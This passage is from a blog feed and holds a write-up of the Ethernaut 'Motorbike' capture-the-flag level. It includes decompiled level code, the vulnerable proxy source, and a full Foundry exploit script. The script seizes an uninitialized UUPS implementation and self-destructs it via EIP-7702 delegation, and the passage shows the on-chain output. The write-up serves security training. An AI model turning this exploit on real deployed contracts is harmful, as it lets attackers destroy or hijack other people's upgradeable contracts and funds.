v5 = MEM[64];                    v6 = v7 = 96 + MEM[64];                    while (v8 &gt;= 32) {                        MEM[v4] = MEM[v6];                        v8 = v8 - 32;                        v4 += 32;                        v6 += 32;                    }                    MEM[v4] = MEM[v6] &amp; ~((uint8.max + 1) ** (32 - v8) - 1) | MEM[v4] &amp; (uint8.max + 1) ** (32 - v8) - 1;                    v9, /* uint256 */ v10, /* uint256 */ v11, /* uint256 */ v12 = address(v2).upgrader().gas(msg.gas);                    if (RETURNDATASIZE() == 0) {                        v13 = v14 = 96;                    } else {                        v13 = v15 = new bytes[](RETURNDATASIZE());                        RETURNDATACOPY(v15.data, 0, RETURNDATASIZE());                    }                    if (!v9) {                        require(!MEM[v13], v12, MEM[v13]);                        v16 = new bytes[](v17.length);                        v18 = v19 = 0;                        while (v18 &lt; v17.length) {                            v16[v18] = v17[v18];                            v18 += 32;                        }                        if (30) {                            MEM[v16.data] = bytes30('Address: low-level call failed');                        }                        revert(Error(v16));                    } else {                        require(keccak256(MEM[32 + v784_0x1V0x62cV0x5e4V0x284V0x8c:32 + v784_0x1V0x62cV0x5e4V0x284V0x8c + MEM[v784_0x1V0x62cV0x5e4V0x284V0x8c]]) == keccak256(this), Error('Wrong upgrader address'));                        if (this.balance &gt;= 0) {                            if (bool(v2.code.size)) {                                v20 = v21 = MEM[64];                                v22 = v23 = 96 + MEM[64];                                while (v24 &gt;= 32) {                                    MEM[v20] = MEM[v22];                                    v24 = v24 - 32;                                    v20 += 32;                                    v22 += 32;                                }                                MEM[v20] = MEM[v22] &amp; ~((uint8.max + 1) ** (32 - v24) - 1) | MEM[v20] &amp; (uint8.max + 1) ** (32 - v24) - 1;                                v25, /* uint256 */ v26, /* uint256 */ v27, /* uint256 */ v28 = address(v2).call(0x564f6d7100000000000000000000000000000000000000000000000000000000 | uint224(MEM[MEM[64] + 96])).gas(msg.gas);                                if (RETURNDATASIZE() == 0) {                                    v29 = v30 = 96;                                } else {                                    v29 = v31 = new bytes[](RETURNDATASIZE());                                    RETURNDATACOPY(v31.data, 0, RETURNDATASIZE());                                }                                if (!v25) {                                    require(!MEM[v29], v28, MEM[v29]);                                    v32 = new bytes[](v33.length);                                    v34 = v35 = 0;                                    while (v34 &lt; v33.length) {                                        v32[v34] = v33[v34];                                        v34 += 32;                                    }                                    if (30) {                                        MEM[v32.data] = bytes30('Address: low-level call failed');                                    }                                    revert(Error(v32));                                } else {                                    require(keccak256(MEM[32 + v784_0x1V0x62cV0x5e4V0x39dV0x8c:32 + v784_0x1V0x62cV0x5e4V0x39dV0x8c + MEM[v784_0x1V0x62cV0x5e4V0x39dV0x8c]]) == keccak256(1000), Error('Wrong horsePower'));                                    return address(v2);                                }                            } else {                                MEM[MEM[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000;                                MEM[MEM[64] + 4] = 32;                                revert(Error('Address: call to non-contract'));                            }                        } else {                            MEM[MEM[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000;                            MEM[4 + MEM[64]] = 32;                            revert(Error('Address: insufficient balance for call'));                        }                    }                } else {                    MEM[MEM[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000;                    MEM[MEM[64] + 4] = 32;                    revert(Error('Address: call to non-contract'));                }            } else {                MEM[MEM[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000;                MEM[4 + MEM[64]] = 32;                revert(Error('Address: insufficient balance for call'));            }        } else {            RETURNDATACOPY(0, 0, RETURNDATASIZE());            revert(0, RETURNDATASIZE());        }    } else {        RETURNDATACOPY(0, 0, RETURNDATASIZE());        revert(0, RETURNDATASIZE());    }}function owner() public nonPayable {     return _owner;}function 0xd38def5b(address varg0, address varg1) public nonPayable {     require(msg.data.length - 4 &gt;= 64);    return bool(!(_createInstance[varg0]).code.size);}// Note: The function selector is not present in the original solidity code.// However, we display it for the sake of completeness.function __function_selector__( function_selector) public payable {     MEM[64] = 128;    if (msg.data.length &lt; 4) {        fallback();    } else if (0x8da5cb5b &gt; function_selector &gt;&gt; 224) {        if (0x715018a6 == function_selector &gt;&gt; 224) {            renounceOwnership();        } else {            require(0x7726f776 == function_selector &gt;&gt; 224);            createInstance(address);        }    } else if (0x8da5cb5b == function_selector &gt;&gt; 224) {        owner();    } else if (0xd38def5b == function_selector &gt;&gt; 224) {        0xd38def5b();    } else {        require(0xf2fde38b == function_selector &gt;&gt; 224);        transferOwnership(address);    }}the Engine Contract is deployed first, and its address is then passed to the Motorbike Contract’s constructor for initialization.While there is a standard formula for deriving the address of a deployed contract, Foundry’s computeCreateAddress() function makes it easy to calculate.uint256 nonce = vm.getNonce(address(level));Motorbike mb_ = Motorbike(payable(vm.computeCreateAddress(address(level), nonce+1)));Engine eg_ = Engine(vm.computeCreateAddress(address(level), nonce));Executing the ContractFinally, simply execute the Contract.Sol(msg.sender).solve(ethernaut, address(level), address(eg_));console.log(\"Motorbike: \", address(mb_));console.log(\"Engine: \", address(eg_));console.log(\"code size: \", _getCodeSize(address(eg_)));Complete Exploit Script// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Ethernaut.sol\";import \"forge-std/Script.sol\";interface Motorbike {    function _getAddressSlot(bytes32 slot) external pure returns (address);    function _delegate(address implementation) external;}interface Engine {    function upgrader() external view returns (address);    function initialize() external;    function upgradeToAndCall(address newImplementation, bytes memory data) external;}contract Ex {    function ex() public {        selfdestruct(payable(tx.origin));    }}contract Sol {    function solve(Ethernaut ethernaut, address level, address _eg) public {        ethernaut.createLevelInstance(Level(level));        Engine(_eg).initialize();        Engine(_eg).upgradeToAndCall(address(new Ex()), abi.encodeWithSignature(\"ex()\"));    }}contract MotorbikeSol is Script {    Ethernaut ethernaut = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);    Level level = Level(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6);    function _getCodeSize(address addr) internal view returns (uint256 size) {        assembly {            size := extcodesize(addr)        }    }    function run() external {        vm.startBroadcast();        Sol sol = new Sol();        uint256 pk = uint256(vm.parseBytes32(vm.promptSecret(\"private key\")));        vm.signAndAttachDelegation(address(sol), pk);        uint256 nonce = vm.getNonce(address(level));        Motorbike mb_ = Motorbike(payable(vm.computeCreateAddress(address(level), nonce+1)));        Engine eg_ = Engine(vm.computeCreateAddress(address(level), nonce));        Sol(msg.sender).solve(ethernaut, address(level), address(eg_));        console.log(\"Motorbike: \", address(mb_));        console.log(\"Engine: \", address(eg_));        console.log(\"code size: \", _getCodeSize(address(eg_)));        vm.stopBroadcast();    }}The complete exploit code is as follows, and executing it yields the following values.$ forge script script/MotorbikeSol.sol:MotorbikeSol --account mingw --sender 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url sepolia --skip-simulation --isolate --broadcast[⠊] Compiling...No files changed, compilation skippedprivate key: [hidden]Script ran successfully.== Logs ==  Motorbike:  0xb6Ee323Edf5e4091239234cA66E73ec0eAc7F3Ff  Engine:  0x8824F3ce858C01E200bF0AA8381d18393C154eAB  code size:  0SKIPPING ON CHAIN SIMULATION.Enter keystore password:##### sepolia✅  [Success] Hash: 0xe664e9415d354643dffb4796de37f7c6df4db23667dfcfbebc18c4d63e2a6b9bContract Address: 0xeD2427fef1Cbb2889662DCE61250c0D4aB5CB52eBlock: 10065934Paid: 0.0006675423286207 ETH (330850 gas * 2.017658542 gwei)##### sepolia✅  [Success] Hash: 0x2c3881cd7e96240ed1b563a9124ab3477beec32430e27c11b925afdad6329f28Block: 10065935Paid: 0.0014929189030595 ETH (754460 gas * 1.978791325 gwei)✅ Sequence #1 on sepolia | Total Paid: 0.0021604612316802 ETH (1085310 gas * avg 1.998224933 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.I can confirm the addresses of the Motorbike and Engine Contracts, and verify that the Engine contract’s code size is 0.Ethernaut SubmissionNow, we need to verify the solution on the Ethernaut site.If we verify by simply clicking the “Submit Instance” button, a different contract—not the one executed in Foundry—will be submitted.Therefore, we must manually submit using the Motorbike Contract address obtained from the Foundry output.Go to the Motorbike challenge page, press F12, and execute the following command in the console tab.await ethereum.request({  method: 'eth_sendTransaction',  params: [{    from: player,    to: '0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6',    data: web3.eth.abi.encodeFunctionCall(      {        name: 'submitLevelInstance',        type: 'function',        inputs: [{type: 'address', name: '_instance'}]      },      ['0xb6Ee323Edf5e4091239234cA66E73ec0eAc7F3Ff']    ),    gas: '0x200000'  }]})This code directly executes the submitLevelInstance() function using the MetaMask API. Upon execution, the submission is completed via MetaMask interaction, and if you refresh the pageWe can confirm that the challenge has been solved.Revoking the Delegation$ cast code 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url sepolia0xef0100ed2427fef1cbb2889662dce61250c0d4ab5cb52eInspecting the wallet address reveals that the code delegation is still active.This must be revoked, as it could be triggered when Ether is received.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"forge-std/Script.sol\";contract MotorbikeSol is Script {    function run() external {        vm.startBroadcast();        uint256 pk = uint256(vm.parseBytes32(vm.promptSecret(\"private key\")));        vm.signAndAttachDelegation(address(0), pk);        payable(msg.sender).transfer(0);        vm.stopBroadcast();    }}The process is similar to the solution steps. However, since the script will not execute without a transaction to broadcast, I triggered a dummy transaction using payable(msg.sender).transfer(0).$ cast code 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url sepolia0x",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is “<code class=\"language-plaintext highlighter-rouge\">selfdestruct</code> its engine and make the motorbike unusable”.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">&lt;</span><span class=\"mf\">0.7</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/utils/Address.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/proxy/Initializable.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Motorbike</span> <span class=\"p\">{</span>    <span class=\"c1\">// keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1</span>    <span class=\"kt\">bytes32</span> <span class=\"k\">internal</span> <span class=\"k\">constant</span> <span class=\"n\">_IMPLEMENTATION_SLOT</span> <span class=\"o\">=</span> <span class=\"mh\">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class=\"p\">;</span>    <span class=\"k\">struct</span> <span class=\"n\">AddressSlot</span> <span class=\"p\">{</span>        <span class=\"kt\">address</span> <span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_logic</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">Address</span><span class=\"p\">.</span><span class=\"n\">isContract</span><span class=\"p\">(</span><span class=\"n\">_logic</span><span class=\"p\">),</span> <span class=\"s\">\"ERC1967: new implementation is not a contract\"</span><span class=\"p\">);</span>        <span class=\"n\">_getAddressSlot</span><span class=\"p\">(</span><span class=\"n\">_IMPLEMENTATION_SLOT</span><span class=\"p\">).</span><span class=\"n\">value</span> <span class=\"o\">=</span> <span class=\"n\">_logic</span><span class=\"p\">;</span>        <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">success</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">_logic</span><span class=\"p\">.</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"initialize()\"</span><span class=\"p\">));</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">success</span><span class=\"p\">,</span> <span class=\"s\">\"Call failed\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Delegates the current call to `implementation`.</span>    <span class=\"k\">function</span> <span class=\"n\">_delegate</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">implementation</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"k\">virtual</span> <span class=\"p\">{</span>        <span class=\"c1\">// solhint-disable-next-line no-inline-assembly</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">calldatacopy</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">calldatasize</span><span class=\"p\">())</span>            <span class=\"kr\">let</span> <span class=\"n\">result</span> <span class=\"o\">:=</span> <span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">gas</span><span class=\"p\">(),</span> <span class=\"n\">implementation</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">calldatasize</span><span class=\"p\">(),</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">)</span>            <span class=\"n\">returndatacopy</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">returndatasize</span><span class=\"p\">())</span>            <span class=\"kr\">switch</span> <span class=\"n\">result</span>            <span class=\"kr\">case</span> <span class=\"mi\">0</span> <span class=\"p\">{</span> <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">returndatasize</span><span class=\"p\">())</span> <span class=\"p\">}</span>            <span class=\"kr\">default</span> <span class=\"p\">{</span> <span class=\"k\">return</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">returndatasize</span><span class=\"p\">())</span> <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Fallback function that delegates calls to the address returned by `_implementation()`.</span>    <span class=\"c1\">// Will run if no other function in the contract matches the call data</span>    <span class=\"k\">fallback</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"k\">virtual</span> <span class=\"p\">{</span>        <span class=\"n\">_delegate</span><span class=\"p\">(</span><span class=\"n\">_getAddressSlot</span><span class=\"p\">(</span><span class=\"n\">_IMPLEMENTATION_SLOT</span><span class=\"p\">).</span><span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Returns an `AddressSlot` with member `value` located at `slot`.</span>    <span class=\"k\">function</span> <span class=\"n\">_getAddressSlot</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">slot</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"k\">pure</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"n\">AddressSlot</span> <span class=\"k\">storage</span> <span class=\"n\">r</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">r_slot</span> <span class=\"o\">:=</span> <span class=\"n\">slot</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Engine</span> <span class=\"k\">is</span> <span class=\"n\">Initializable</span> <span class=\"p\">{</span>    <span class=\"c1\">// keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1</span>    <span class=\"kt\">bytes32</span> <span class=\"k\">internal</span> <span class=\"k\">constant</span> <span class=\"n\">_IMPLEMENTATION_SLOT</span> <span class=\"o\">=</span> <span class=\"mh\">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">upgrader</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">horsePower</span><span class=\"p\">;</span>    <span class=\"k\">struct</span> <span class=\"n\">AddressSlot</span> <span class=\"p\">{</span>        <span class=\"kt\">address</span> <span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">initialize</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"n\">initializer</span> <span class=\"p\">{</span>        <span class=\"n\">horsePower</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span><span class=\"p\">;</span>        <span class=\"n\">upgrader</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Upgrade the implementation of the proxy to `newImplementation`</span>    <span class=\"c1\">// subsequently execute the function call</span>    <span class=\"k\">function</span> <span class=\"n\">upgradeToAndCall</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newImplementation</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">memory</span> <span class=\"n\">data</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">_authorizeUpgrade</span><span class=\"p\">();</span>        <span class=\"n\">_upgradeToAndCall</span><span class=\"p\">(</span><span class=\"n\">newImplementation</span><span class=\"p\">,</span> <span class=\"n\">data</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Restrict to upgrader role</span>    <span class=\"k\">function</span> <span class=\"n\">_authorizeUpgrade</span><span class=\"p\">()</span> <span class=\"k\">internal</span> <span class=\"k\">view</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">upgrader</span><span class=\"p\">,</span> <span class=\"s\">\"Can't upgrade\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span>    <span class=\"k\">function</span> <span class=\"n\">_upgradeToAndCall</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newImplementation</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">memory</span> <span class=\"n\">data</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"p\">{</span>        <span class=\"c1\">// Initial upgrade and setup call</span>        <span class=\"n\">_setImplementation</span><span class=\"p\">(</span><span class=\"n\">newImplementation</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">length</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">success</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">newImplementation</span><span class=\"p\">.</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">);</span>            <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">success</span><span class=\"p\">,</span> <span class=\"s\">\"Call failed\"</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Stores a new address in the EIP1967 implementation slot.</span>    <span class=\"k\">function</span> <span class=\"n\">_setImplementation</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newImplementation</span><span class=\"p\">)</span> <span class=\"k\">private</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">Address</span><span class=\"p\">.</span><span class=\"n\">isContract</span><span class=\"p\">(</span><span class=\"n\">newImplementation</span><span class=\"p\">),</span> <span class=\"s\">\"ERC1967: new implementation is not a contract\"</span><span class=\"p\">);</span>        <span class=\"n\">AddressSlot</span> <span class=\"k\">storage</span> <span class=\"n\">r</span><span class=\"p\">;</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">r_slot</span> <span class=\"o\">:=</span> <span class=\"n\">_IMPLEMENTATION_SLOT</span>        <span class=\"p\">}</span>        <span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">=</span> <span class=\"n\">newImplementation</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><h1 id=\"exploit\">Exploit</h1><hr /><h2 id=\"attempted-solution\">Attempted Solution</h2><p>The goal was to <code class=\"language-plaintext highlighter-rouge\">selfdestruct</code> the Engine. Leveraging the fact that the Engine contract was uninitialized, I executed the Engine’s <code class=\"language-plaintext highlighter-rouge\">initialize()</code> function to claim the <code class=\"language-plaintext highlighter-rouge\">upgrader</code> role. Then, I invoked <code class=\"language-plaintext highlighter-rouge\">upgradeToAndCall()</code> to trigger the self-destruct, but I was unable to solve the challenge.</p><p>To understand the solution requirements, I examined the Level instance code:</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"mh\">0xd38def5b</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">varg0</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">varg1</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">nonPayable</span> <span class=\"p\">{</span>     <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">length</span> <span class=\"o\">-</span> <span class=\"mi\">4</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">64</span><span class=\"p\">);</span>    <span class=\"k\">return</span> <span class=\"kt\">bool</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"p\">(</span><span class=\"n\">_createInstance</span><span class=\"p\">[</span><span class=\"n\">varg0</span><span class=\"p\">]).</span><span class=\"n\">code</span><span class=\"p\">.</span><span class=\"n\">size</span><span class=\"p\">);</span><span class=\"p\">}</span></code></pre></div></div><p>I found the <code class=\"language-plaintext highlighter-rouge\">validateInstance()</code> function, which is executed when submitting the instance.</p><p><img src=\"https://0o3q.github.io/images/2026-01-17-Motorbike/etherscan.png\" alt=\"Image etherscan\" /><img src=\"https://0o3q.github.io/images/2026-01-17-Motorbike/4bytes.png\" alt=\"Image 4bytes\" /></p><p>Checks if the Engine contract’s <code class=\"language-plaintext highlighter-rouge\">code.size</code> is 0.</p><aside>💡Warning (5159): \"selfdestruct\" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.</aside><p>This is the warning message displayed in Foundry when executing <code class=\"language-plaintext highlighter-rouge\">selfdestruct</code>.</p><p>As indicated by the warning, there is an exception when the operation is executed within a transaction. I leveraged this exception to solve the challenge.</p><p>First, I deployed an Ex Contract containing a <code class=\"language-plaintext highlighter-rouge\">selfdestruct</code> function to be delegated to the Engine. Exploiting the fact that the Engine Contract was uninitialized, I claimed the <code class=\"language-plaintext highlighter-rouge\">upgrader</code> role. Finally, I used <code class=\"language-plaintext highlighter-rouge\">upgradeToAndCall()</code> to delegate execution to the Ex Contract, triggering the <code class=\"language-plaintext highlighter-rouge\">selfdestruct</code>.</p><h2 id=\"deploying-the-assist-contract\">Deploying the Assist Contract</h2><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">selfdestruct</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">));</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Sol</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">solve</span><span class=\"p\">(</span><span class=\"n\">Ethernaut</span> <span class=\"n\">ethernaut</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">level</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_eg</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">ethernaut</span><span class=\"p\">.</span><span class=\"n\">createLevelInstance</span><span class=\"p\">(</span><span class=\"n\">Level</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">));</span>        <span class=\"n\">Engine</span><span class=\"p\">(</span><span class=\"n\">_eg</span><span class=\"p\">).</span><span class=\"n\">initialize</span><span class=\"p\">();</span>        <span class=\"n\">Engine</span><span class=\"p\">(</span><span class=\"n\">_eg</span><span class=\"p\">).</span><span class=\"n\">upgradeToAndCall</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">()),</span> <span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"ex()\"</span><span class=\"p\">));</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">ethernaut.createLevelInstance(Level(level))</code> is the function that runs when you click the “Get new instance” button on Ethernaut. You can check the full details <a href=\"https://sepolia.etherscan.io/address/0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6#code\">here</a>.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>    <span class=\"k\">function</span> <span class=\"n\">createLevelInstance</span><span class=\"p\">(</span><span class=\"n\">Level</span> <span class=\"n\">_level</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"c1\">// Ensure level is registered.</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">registeredLevels</span><span class=\"p\">[</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">_level</span><span class=\"p\">)],</span> <span class=\"s\">\"This level doesn't exists\"</span><span class=\"p\">);</span>        <span class=\"c1\">// Get level factory to create an instance.</span>        <span class=\"kt\">address</span> <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"n\">_level</span><span class=\"p\">.</span><span class=\"n\">createInstance</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">}(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"c1\">// Store emitted instance relationship with player and level.</span>        <span class=\"n\">emittedInstances</span><span class=\"p\">[</span><span class=\"n\">instance</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">EmittedInstanceData</span><span class=\"p\">(</span>            <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span>            <span class=\"n\">_level</span><span class=\"p\">,</span>            <span class=\"nb\">false</span>        <span class=\"p\">);</span>        <span class=\"n\">statistics</span><span class=\"p\">.</span><span class=\"n\">createNewInstance</span><span class=\"p\">(</span><span class=\"n\">instance</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">_level</span><span class=\"p\">),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"c1\">// Retrieve created instance via logs.</span>        <span class=\"k\">emit</span> <span class=\"n\">LevelInstanceCreatedLog</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">instance</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">_level</span><span class=\"p\">));</span>    <span class=\"p\">}</span></code></pre></div></div><h2 id=\"delegating-to-the-sol-contract\">Delegating to the Sol contract</h2><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Sol</span> <span class=\"n\">sol</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Sol</span><span class=\"p\">();</span><span class=\"kt\">uint256</span> <span class=\"n\">pk</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">parseBytes32</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">promptSecret</span><span class=\"p\">(</span><span class=\"s\">\"private key\"</span><span class=\"p\">)));</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">signAndAttachDelegation</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">sol</span><span class=\"p\">),</span> <span class=\"n\">pk</span><span class=\"p\">);</span></code></pre></div></div><p>After deploying the Sol contract, I executed the <code class=\"language-plaintext highlighter-rouge\">signAndAttachDelegation()</code> function using the private key.</p><p>The <code 